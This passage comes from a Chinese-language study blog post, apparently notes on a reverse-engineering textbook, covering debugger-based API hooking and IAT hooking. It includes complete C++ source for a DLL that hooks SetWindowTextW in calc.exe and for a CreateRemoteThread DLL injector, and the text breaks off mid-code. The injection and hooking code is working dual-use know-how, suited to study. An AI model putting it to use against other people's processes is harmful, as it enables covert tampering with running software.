class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">// 使用DebugActiveProcess，将调试器hookdbg附加到目标进程notepad.exe中</span></span><br><span class="line">	<span class="comment">// dwPID为目标进程的pid</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">DebugActiveProcess</span>(dwPID))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DebugActiveProcess(%d) failed!!!\n&quot;</span></span><br><span class="line">               <span class="string">&quot;Error Code = %d\n&quot;</span>, dwPID, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调试器循环，处理来自被调试者的调试事件</span></span><br><span class="line">    <span class="built_in">DebugLoop</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;注：还有一个函数叫做：<code>DebugSetProcessKillOnExit</code>，它可以在不销毁被调试进程的情况下退出调试器，也就是<code>detach</code>。需要注意的是，必须在调试器终止前脱钩（也就是把断点恢复），否则，调用API时就会因为其起始部分仍为<code>0xCC</code>而导致异常，从而终止被调试进程。</p>
<p>&emsp;上述代码中<code>Sleep(0)</code>的作用（重点）：<strong>调用<code>Sleep(0)</code>函数可以释放当前线程的剩余时间片，即放弃当前线程执行的CPU时间片。也就是说，调用<code>Sleep(0)</code>函数后，CPU会立即执行其他线程</strong>。</p>
<p>&emsp;<strong>具体是啥意思呢？就是，如果不加入<code>Sleep(0)</code>，CPU会运行完这个时间片，这个时间片是调试进程<code>hookdbg.exe</code>占用的，然后，<code>notepad.exe</code>还没开始运行正常的<code>writefile</code>过程，这个时间片就运行到<code>hookdbg.exe</code>的下一句了，也就是更改首字节为<code>0xCC</code>。</strong></p>
<h2 id="0x02-关于调试器"><a href="#0x02-关于调试器" class="headerlink" title="0x02 关于调试器"></a>0x02 关于调试器</h2><p>&emsp;略。</p>
<h2 id="0x03-计算器显示中文数字"><a href="#0x03-计算器显示中文数字" class="headerlink" title="0x03 计算器显示中文数字"></a>0x03 计算器显示中文数字</h2><p>&emsp;本节中，<strong>通过注入DLL文件来钩取某个API，DLL文件注入目标进程后，修改IAT来更改进程中调用的特定API</strong>。<strong>以计算器(<code>calc.exe</code>)为示例，向计算器进程插入用户的DLL文件，钩取IAT的<code>user32.SetWindowTextW</code>地址。此函数被钩取之后，计算器中显示出的将是中文数字，而不是阿拉伯数字。</strong>本节的技术图表如下：</p>
<p><img src="/images/re-core-principle-3/image-20230413141834499.png" alt="image-20230413141834499" style="zoom: 50%;" /></p>
<p>&emsp;<strong>优点：</strong>实现简单，只需先将要钩取的API在用户的DLL中<strong>重定义</strong>，然后再注入目标进程即可。<strong>缺点：</strong>如果想钩取的API不在目标进程的IAT中，那么就无法使用该技术进行钩取操作，即如果要钩取的API是由<strong>程序代码动态加载DLL文件</strong>来使用的，那么将无法使用这项技术。</p>
<p>&emsp;使用PEview看calc.exe所用的API，如下所示：</p>
<p><img src="/images/re-core-principle-3/image-20230413143304760.png" alt="image-20230413143304760" style="zoom:50%;" /></p>
<p>&emsp;注意两个API：<code>SetWindowTextW</code>、<code>SetDlgItemTextW</code>。其中<code>SetDlgItemTextW</code>调用了<code>SetWindowTextW</code>，所以我们只需要钩取<code>SetWindowTextW</code>即可。<code>SetWindowTextW</code>定义如下：</p>
<p><img src="/images/re-core-principle-3/image-20230413143527735.png" alt="image-20230413143527735" style="zoom:70%;" /></p>
<p>&emsp;所以，钩取时只需要将<code>lpString</code>中的阿拉伯数字转为中文数字即可。<strong>注：（1）<code>SetWindowTextW</code>中的<code>W</code>代表宽字符（Unicode），与其对应的<code>SetWindowTextA</code>代表ASCII字符。（2）Unicode码中每个汉字占2个字节。</strong>具体细节见P311。</p>
<h3 id="IAT钩取工作原理"><a href="#IAT钩取工作原理" class="headerlink" title="IAT钩取工作原理"></a>IAT钩取工作原理</h3><p>&emsp;下图表示正常调用<code>SetWindowTextW</code>的程序执行流：</p>
<p><img src="/images/re-core-principle-3/image-20230413145110863.png" alt="image-20230413145110863" style="zoom:50%;" /></p>
<p>&emsp;下图是IAT被钩取后<code>SetWindowTextW</code>的调用流程：</p>
<p><img src="/images/re-core-principle-3/image-20230413145853762.png" alt="image-20230413145853762" style="zoom:50%;" /></p>
<p>&emsp;可以保证，在保持运行代码不变的前提下，将IAT中保存的API地址变为用户函数的地址。函数操作见P315。</p>
<h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p><strong>补充：</strong></p>
<ul>
<li>FARPROC关键字。FARPROC是一个函数指针类型，通常用于Windows平台的动态链接库（DLL）中。在Windows平台上，DLL中的函数通常被导出为外部符号（external symbols），并且在运行时动态链接到程序中。FARPROC是一个函数指针类型，可以用来指向这些导出的函数。它的定义如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef int (FAR WINAPI *FARPROC)();</span><br></pre></td></tr></table></figure>
<p>&emsp;其中，<code>FAR</code>和<code>WINAPI</code>是Windows API中的宏定义，用于表示函数指针的调用约定和存储方式。<code>FARPROC</code>指向一个无返回值、无参数的函数，可以根据实际情况进行类型转换。<strong>在使用DLL中的函数时，可以使用Windows API中的<code>GetProcAddress</code>函数获取导出函数的地址，并将其转换为FARPROC类型的函数指针，然后通过调用该指针来调用DLL中的函数。</strong></p>
<p>&emsp;<strong>钩取过程如下：</strong>使用<code>InjectDll.exe</code>，向计算器进程<code>calc.exe</code>中注入<code>hookiat.dll</code>。</p>
<h4 id="hookiat-dll代码如下："><a href="#hookiat-dll代码如下：" class="headerlink" title="hookiat.dll代码如下："></a><code>hookiat.dll</code>代码如下：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookiat.cpp -&gt; hookiat.dll</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// include</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;wchar.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFSETWINDOWTEXTW)</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// globals</span></span><br><span class="line">FARPROC g_pOrgFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体更换字符串的函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">MySetWindowTextW</span><span class="params">(HWND hWnd, LPWSTR lpString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">wchar_t</span>* pNum = <span class="string">L&quot;零一二三四五六七八九&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> temp[<span class="number">2</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, nLen = <span class="number">0</span>, nIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nLen = <span class="built_in">wcslen</span>(lpString);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="string">L&#x27;9&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            temp[<span class="number">0</span>] = lpString[i];</span><br><span class="line">            nIndex = _wtoi(temp);</span><br><span class="line">            lpString[i] = pNum[nIndex];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// user32!SetWindowTextW() 地址</span></span><br><span class="line">    <span class="keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// hook_iat</span></span><br><span class="line"><span class="function">BOOL <span class="title">hook_iat</span><span class="params">(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hMod;</span><br><span class="line">	LPCSTR szLibName;</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImportDesc; </span><br><span class="line">	PIMAGE_THUNK_DATA pThunk;</span><br><span class="line">	DWORD dwOldProtect, dwRVA;</span><br><span class="line">	PBYTE pAddr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hMod, pAddr = ImageBase of calc.exe</span></span><br><span class="line">    <span class="comment">//             = VA to MZ signature (IMAGE_DOS_HEADER)</span></span><br><span class="line">	hMod = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">	pAddr = (PBYTE)hMod;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pAddr = VA to PE signature (IMAGE_NT_HEADERS)</span></span><br><span class="line">	pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table</span></span><br><span class="line">	dwRVA = *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table</span></span><br><span class="line">	pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">// szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name</span></span><br><span class="line">		szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);</span><br><span class="line">		<span class="keyword">if</span>( !_stricmp(szLibName, szDllName) )</span><br><span class="line">		&#123;</span><br><span class="line">            <span class="comment">// pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk</span></span><br><span class="line">            <span class="comment">//        = VA to IAT(Import Address Table)</span></span><br><span class="line">			pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + </span><br><span class="line">                                         pImportDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// pThunk-&gt;u1.Function = VA to API</span></span><br><span class="line">			<span class="keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg )</span><br><span class="line">				&#123;</span><br><span class="line">                    <span class="comment">// 更改内存属性为 E/R/W</span></span><br><span class="line">					<span class="built_in">VirtualProtect</span>((LPVOID)&amp;pThunk-&gt;u1.Function, </span><br><span class="line">                                   <span class="number">4</span>, </span><br><span class="line">                                   PAGE_EXECUTE_READWRITE, </span><br><span class="line">                                   &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 修改 IAT 值（钩取）</span></span><br><span class="line">                    pThunk-&gt;u1.Function = (DWORD)pfnNew;</span><br><span class="line">					</span><br><span class="line">                    <span class="comment">// 恢复内存属性</span></span><br><span class="line">                    <span class="built_in">VirtualProtect</span>((LPVOID)&amp;pThunk-&gt;u1.Function, </span><br><span class="line">                                   <span class="number">4</span>, </span><br><span class="line">                                   dwOldProtect, </span><br><span class="line">                                   &amp;dwOldProtect);						</span><br><span class="line"></span><br><span class="line">					<span class="keyword">return</span> TRUE;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>( fdwReason )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">            <span class="comment">// 保持原始 API 地址</span></span><br><span class="line">           	g_pOrgFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;user32.dll&quot;</span>), <span class="string">&quot;SetWindowTextW&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// # hook</span></span><br><span class="line">            <span class="comment">//  用 user32!SetWindowTextW() 钩取 hookiat!MySetWindowText()</span></span><br><span class="line">			<span class="built_in">hook_iat</span>(<span class="string">&quot;user32.dll&quot;</span>, g_pOrgFunc, (PROC)MySetWindowTextW);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">            <span class="comment">// # unhook</span></span><br><span class="line">            <span class="comment">//   将 calc.exe 的 IAT 恢复原值</span></span><br><span class="line">            <span class="built_in">hook_iat</span>(<span class="string">&quot;user32.dll&quot;</span>, (PROC)MySetWindowTextW, g_pOrgFunc);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="InjectDll-exe代码如下："><a href="#InjectDll-exe代码如下：" class="headerlink" title="InjectDll.exe代码如下："></a><code>InjectDll.exe</code>代码如下：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InjectDll.cpp -&gt; InjectDll.exe</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;winbase.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">usage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nInjectDll.exe by ReverseCore\n&quot;</span></span><br><span class="line">           <span class="string">&quot;- blog  : http://www.reversecore.com\n&quot;</span></span><br><span class="line">           <span class="string">&quot;- email : reversecore@gmail.com\n\n&quot;</span></span><br><span class="line">           <span class="string">&quot;- USAGE : InjectDll.exe &lt;i|e&gt; &lt;PID&gt; &lt;dll_path&gt;\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess, hThread;</span><br><span class="line">	LPVOID pRemoteBuf;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">	LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD dwErr = <span class="built_in">GetLastError</span>();</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	pRemoteBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bMore = FALSE, bFound = FALSE;</span><br><span class="line">	HANDLE hSnapshot, hProcess, hThread;</span><br><span class="line">	MODULEENTRY32 me = &#123; <span class="built_in">sizeof</span>(me) &#125;;</span><br><span class="line">	LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( INVALID_HANDLE_VALUE == (hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, dwPID)) )</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	bMore = <span class="built_in">Module32First</span>(hSnapshot, &amp;me);</span><br><span class="line">	<span class="keyword">for</span>( ;bMore ;bMore = <span class="built_in">Module32Next</span>(hSnapshot, &amp;me) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>( !_tcsicmp(me.szModule, szDllName) || !_tcsicmp(me.szExePath, szDllName) )</span><br><span class="line">		&#123;</span><br><span class="line">			bFound = TRUE;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !bFound )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( !(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;FreeLibrary&quot;</span>);</span><br><span class="line">	hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD _EnableNTPrivilege(LPCTSTR szPrivilege, DWORD dwState)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwRtn = <span class="number">0</span>;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		LUID luid;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, szPrivilege, &amp;luid))</span><br><span class="line">		&#123;</span><br><span class="line">			BYTE t1[<span class="built_in">sizeof</span>(TOKEN_PRIVILEGES) + <span class="built_in">sizeof</span>(LUID_AND_ATTRIBUTES)];</span><br><span class="line">			BYTE t2[<span class="built_in">sizeof</span>(TOKEN_PRIVILEGES) + <span class="built_in">sizeof</span>(LUID_AND_ATTRIBUTES)];</span><br><span class="line">			DWORD cbTP = <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES) + <span class="built_in">sizeof</span> (LUID_AND_ATTRIBUTES);</span><br><span class="line"></span><br><span class="line">			PTOKEN_PRIVILEGES pTP = (PTOKEN_PRIVILEGES)t1;</span><br><span class="line">			PTOKEN_PRIVILEGES pPrevTP = (PTOKEN_PRIVILEGES)t2;</span><br><span class="line"></span><br><span class="line">			pTP-&gt;PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">			pTP-&gt;Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">			pTP-&gt;Privileges[<span class="number">0</span>].Attributes = dwState;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, pTP, cbTP, pPrevTP, &amp;cbTP))</span><br><span class="line">				dwRtn = pPrevTP-&gt;Privileges[<span class="number">0</span>].Attributes;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	    <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dwRtn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">usage</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// adjust privilege</span></span><br><span class="line">	_EnableNTPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// InjectDll.exe &lt;i|e&gt; &lt;PID&gt; &lt;dll_path&gt;</span></span><br><span class="line">    <span class="keyword">if</span>( !_tcsicmp(argv[<span class="number">1</span>], <span class="string">L&quot;i&quot;</span>) )</span><br><span class="line">        <span class="built_in">InjectDll</span>((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">else</span> <span 